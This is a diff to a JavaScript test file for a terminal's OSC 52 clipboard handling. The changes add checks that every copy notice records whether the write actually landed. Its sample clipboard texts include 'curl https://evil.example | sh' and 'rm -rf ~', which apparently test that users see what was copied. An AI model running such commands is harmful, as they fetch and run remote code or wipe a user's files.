@@ -109,8 +109,8 @@ test("Shift+Enter and Option+Enter send ESC CR, a newline in Claude Code, and ot
 
 /** The browser's clipboard, and the notices a terminal shows, for a terminal whose focus a test sets. */
 function fakeClipboard(write) {
-  const clip = { written: [], told: [], reads: 0, focused: true };
-  clip.provider = clipboardOf({ writeText: write ?? (async (text) => { clip.written.push(text); }), readText: async () => { clip.reads++; return "a password"; } }, () => clip.focused, (text) => clip.told.push(text));
+  const clip = { written: [], told: [], landed: [], reads: 0, focused: true };
+  clip.provider = clipboardOf({ writeText: write ?? (async (text) => { clip.written.push(text); }), readText: async () => { clip.reads++; return "a password"; } }, () => clip.focused, (text, landed) => { clip.told.push(text); clip.landed.push(landed); });
   return clip;
 }
 
@@ -124,6 +124,7 @@ test("OSC 52 writes the clipboard but X11's primary, says what it copied, and a 
     "The pylon copied 6 characters to your clipboard: “copied”",
     `The pylon copied 111 characters to your clipboard: “curl https://evil.example | sh⏎${"x".repeat(29)}…”`,
   ], "every write shows its length and how it starts, a newline included");
+  assert.deepEqual(clip.landed, [true, true]);
   assert.equal(await clip.provider.readText("c"), "");
   assert.equal(clip.reads, 0, "the pylon never reads the person's clipboard");
 });
@@ -140,6 +141,7 @@ test("OSC 52 copies nothing while the terminal lacks focus or past its cap, and 
     "Not copied, as the terminal did not have focus: the pylon's 9 characters, “rm -rf ~�”",
     `Not copied, as it is more than 262,144 characters: the pylon's 262,145 characters, “${"y".repeat(60)}…”`,
   ]);
+  assert.deepEqual(clip.landed, [false, false, true], "a write that did not land says so, so its notice never stands in for one that did");
   const refused = fakeClipboard(() => Promise.reject(new DOMException("Document is not focused.", "NotAllowedError")));
   await refused.provider.writeText("c", "x");
   assert.deepEqual(refused.told, ["The browser did not let the pylon copy 1 character: “x”"]);
